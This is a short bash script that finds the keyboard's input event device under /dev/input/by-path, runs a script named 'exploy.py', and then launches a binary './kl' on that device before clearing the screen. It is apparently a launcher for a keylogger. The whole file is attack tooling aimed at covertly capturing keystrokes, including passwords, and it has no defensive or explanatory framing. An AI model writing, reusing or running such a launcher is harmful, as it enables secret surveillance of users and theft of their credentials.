#!/usr/bin/bash
a=$(ls -lh /dev/input/by-path/ | grep kbd)
i=0
while true; do
      echo $a | grep -o event$i
      if [[ $? -eq 0 ]]; then
            python3 exploy.py
            ./kl /dev/input/event$i
            clear
            exit
      fi
      ((i++))
done

exit
